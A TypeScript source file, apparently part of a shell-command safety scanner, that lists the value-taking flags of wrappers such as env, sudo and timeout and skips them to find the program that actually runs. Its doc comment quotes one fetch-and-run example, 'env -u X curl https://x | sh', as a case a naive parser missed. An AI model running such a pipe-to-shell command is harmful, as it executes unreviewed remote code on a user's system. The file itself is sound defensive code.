/**
 * Where a wrapper's own flags end and the command it runs begins. `env -u X
 * cmd` has a flag with a value (`X` is not a program), `timeout 5 cmd` has a
 * duration, `sudo -u root cmd` names a user. A reader that skips only the
 * words that start with `-` takes `X`, `5` or `root` for the program and then
 * misses what runs: `env -u X curl https://x | sh` was read as a program named
 * `x`. One table, so the scans that look through wrappers agree.
 */
const VALUE_FLAGS: Record<string, ReadonlySet<string>> = {
  env: new Set(["-u", "-C", "--unset", "--chdir"]),
  sudo: new Set([
    "-u",
    "-g",
    "-h",
    "-p",
    "-C",
    "-D",
    "-R",
    "-r",
    "-t",
    "-T",
    "-U",
  ]),
  doas: new Set(["-u", "-C"]),
  exec: new Set(["-a"]),
  time: new Set(["-f", "-o"]),
  nice: new Set(["-n"]),
  timeout: new Set(["-s", "-k", "--signal", "--kill-after"]),
  stdbuf: new Set(["-i", "-o", "-e"]),
  ionice: new Set(["-c", "-n", "-p"]),
};

/** The index of the first word after a wrapper's flags, their values and `--`. */
export function skipWrapperFlags(
  words: readonly string[],
  from: number,
  wrapper: string,
): number {
  const withValue = Object.hasOwn(VALUE_FLAGS, wrapper)
    ? VALUE_FLAGS[wrapper]
    : undefined;
  let i = from;
  for (; i < words.length; i++) {
    const w = words[i];
    if (w === "--") {
      i++;
      break;
    }
    if (withValue?.has(w)) {
      i++;
      continue;
    }
    if (w.startsWith("-") && w.length > 1) continue;
    break;
  }
  // timeout takes a duration before the command
  if (wrapper === "timeout" && /^\d/.test(words[i] ?? "")) i++;
  return i;
}
